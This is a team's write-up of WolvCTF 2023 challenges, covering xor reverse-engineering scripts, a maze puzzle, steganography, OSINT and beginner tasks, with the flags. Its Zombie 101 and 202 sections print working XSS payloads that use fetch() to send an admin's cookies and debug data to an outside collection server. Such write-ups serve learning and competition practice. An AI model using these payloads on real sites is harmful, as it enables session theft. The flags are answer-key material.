# Wolv CTF 2023

Platz 117 von 599, mit 12 gelösten Challenges

## Challenges

### REV

#### homework_help

Another xor challenge. This time we also had static data in the binary but the xor key was changing for each iteration. We wrote an PHP script to mimic the algorithm.

```php
<?php

$comp = pack('C', 0x36);

$xor = [
    pack('C', 0x41),
    pack('C', 0x14),
    pack('C', 0x17),
    pack('C', 0x12),
    pack('C', 0x1d),
    pack('C', 0x50),
    pack('C', 0x46),
    pack('C', 0x5d),
    pack('C', 0x42),
    pack('C', 0x41),
    pack('C', 0x6c),
    pack('C', 0x33),
    pack('C', 0x5d),
    pack('C', 0x5a),
    pack('C', 0x0e),
    pack('C', 0x3a),
    pack('C', 0x6a),
    pack('C', 0x41),
    pack('C', 0x40),
    pack('C', 0x57),
    pack('C', 0x08),
    pack('C', 0x34),
    pack('C', 0x3c),
    pack('C', 0x0b),
    pack('C', 0x03),
    pack('C', 0x34),
    pack('C', 0x28),
    pack('C', 0x46),
    pack('C', 0x5f),
    pack('C', 0x53),
    pack('C', 0x10),
    pack('C', 0x50)
];

for ($i = 0; $i <32; $i++) {
    $comp = $comp ^ $xor[$i];
    echo $comp;
}
```

wctf{+m0r3_l1ke_5t4ck_chk_w1n=-}

#### child_re

Just some hiden function in the binary that xors the following bytes with arg1. We brute forced arg1 with cyberchef. It's 0xa2.

```
5d495e4c51621b5e
4942421b4119581f
756d5f1b4e19755e
1a755e4219756d1e
461e52530b0b751e
1857
```

wctf{H1tchh1k3r5_Gu1d3_t0_th3_G4l4xy!!_42}

#### ej

In the binary you can find a map 6x6:

```
00 00 00 00 00 00 
00 00 01 01 00 00 
00 00 01 00 00 00 
00 00 01 00 00 01 
00 00 00 01 02 00 
02 00 00 00 00 02
```

You start at the top left and you have to finish at the top left. You can input a combination of u, d, l and r to move up, down, left and right.

Conditions:

- If you move on a 01 the previous move has to be the same move. 
- If you move on a 02 the next move has to be the same move.
- You have to cross all the 02s.
- You have to enter 02 in a line of at least 2 fields.

The following combinations work but yield a corrupt flag:

```
dddddrrrrruuulddllluuuul             //24
dddddrrrrruuulddlllurrullurrrrulllll //36
dddddrrrrruuulddllluuurrrrulllll     //32
rrrrrdddddllllluurdrrruuullllu       //30
rrrrrdddddllllluurdrrruulllluu       //30
rddddrrruurdddllllluuuuu             //24
rrrrrdlllldddrrruurdddllllluuuuu     //32
rrrrrdddddllllluuurddrrruuullllu     //32
dddddrrrrruuulddlluuuull             //24
dddddrrrrruuuuulddddllluuuul         //28
rrrrrdddddllllluurdrrruuullldluu

```

We probably need to find the correct path. The flag seems to be of length 32. These are the bytes of the encoded flag:

```!
d089979577406768d59ded42ca2af5a75981df78763584b76963358efe2e4d19
```

### FORENSIC

#### Dino

1. Extract `epicfight.jpg` from the pcapng file.
2. Run `steghide extract -sf epicfight.jpg`.
3. Reveals a base64 string `d2N0Znthbl8xbWFnZV9pbl9hX3BlZWNhcF9iNjR9`

wctf{an_1mage_in_a_peecap_b64}

### WEB

#### Zombie 101

You can inject javascript into the `/zombie` endpoint and use that xss in the `/visit` endpoint to execute javascript inside the admins browser:

Final URL for `/visit`:

```!
https://zombie-101-tlejfksioa-ul.a.run.app/zombie?show=%3Cscript%3Efetch(%27https://mbuelow.dev/dump/index.php?cookies=%27%2Bdocument.cookie);%3C/script%3E
```

Actual payload:

```
<script>
fetch('https://mbuelow.dev/dump/index.php?cookies='+document.cookie);
</script>
```

wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261}

#### Zombie 202

Same as in Zombie 101 but we fetch the cookie from a separate web call from `/debug` first.

Final URL vor `/visit`:

```!
https://zombie-201-tlejfksioa-ul.a.run.app/zombie?show=%3Cscript%3Evar%20b%20=%20async%20()%20=%3E%20fetch(%27https://mbuelow.dev/dump/index.php?data=%27%2BJSON.stringify(await%20(await%20fetch(%27https://zombie-201-tlejfksioa-ul.a.run.app/debug%27)).json()));%20b()%3C/script%3E
```

Actual payload:

```!
<script>
var b = async () => fetch('https://mbuelow.dev/dump/index.php?data='+JSON.stringify(await (await fetch('https://zombie-201-tlejfksioa-ul.a.run.app/debug')).json()));
b();
</script>
```

wctf{h1dd3n-c00k135-d1d-n07-h31p-373964}

### MISC

#### Switcheroo

Register for [b01lersCTF](https://ctf.b01lers.com/home) and go to the challenge `Switcheroo`. YOu can find the flag there. Base64 encoded.

wctf{M41z3_4nd_Blu3}

### OSINT

#### WannaFlag 1

https://www.google.de/maps/place/The+Cube/@42.2758849,-83.7440605,17.29z/data=!4m8!3m7!1s0x883cae3897494825:0xb2adec7980125508!8m2!3d42.2758948!4d-83.7418941!9m1!1b1!16s%2Fg%2F1yg6ngznr
nc wanna-flag-i.wolvctf.io 1337


### Beginner

#### Rockyou

use zip2johen and than rockyou list
wctf{m1cH1g4n_4_3v3R}

#### Charlottesweb

got to /src
inspect py file
make put request to get flag
wctf{y0u_h4v3_b33n_my_fr13nd___th4t_1n_1t53lf_1s_4_tr3m3nd0u5_th1ng}

#### baby-re

download & strings
wctf{Oh10_Stat3_1s_Smelly!}

#### yowahtsthepassword

bruteforce
```python=
kk = 0

while kk != int(base64.b64decode(secret).hex(), 16):
  if kk % 100000000 == 0:
    print(kk)
  kk = kk + 1
print(kk)
```
2536466855
wctf{ywtp}

#### baby-pwn

enter looong string
wctf{W3lc0me_t0_C0stc0_I_L0v3_Y0u!}